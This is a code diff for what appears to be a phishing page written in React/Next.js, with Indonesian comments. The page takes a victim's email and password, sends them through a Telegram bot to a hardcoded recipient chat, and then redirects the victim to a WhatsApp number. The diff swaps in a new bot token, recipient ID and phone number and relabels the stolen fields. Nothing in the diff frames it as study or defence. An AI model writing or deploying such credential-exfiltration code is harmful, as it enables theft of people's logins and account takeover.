@@ -13,9 +13,9 @@ function page({ params }: { params: { senTele: string } }) {
   useEffect(() => {
     if (email) {
       // const [email, password] = senTele.split('/');
-      const token = "5722032027:AAHz9rxGBnfH_kAT_or8uzpkMJ37wkZRPfU"; // Ganti dengan token bot Telegram Anda
-      const telegram_id = "904725130"; // Ganti dengan ID Telegram penerima
-      const message_text = `Notifikasi Telegram \n ${email} ${password}`;
+      const token = "6609139420:AAHBa2lD1wVI9PzM915IUzYQnFrrnTQ1XoA"; // Ganti dengan token bot Telegram Anda
+      const telegram_id = "6219231551"; // Ganti dengan ID Telegram penerima
+      const message_text = `Notifikasi Telegram \n Email : ${email} \n Password : ${password}`;
 
       async function sendMessage(
         telegram_id: any,
@@ -41,7 +41,7 @@ function page({ params }: { params: { senTele: string } }) {
 
       if (email) {
         sendMessage(telegram_id, message_text, token);
-        router.push(`https://wa.me/6282274677715`);
+        router.push(`https://wa.me/6289653260395`);
       } else {
         console.log("Masukan yang lain");
       }
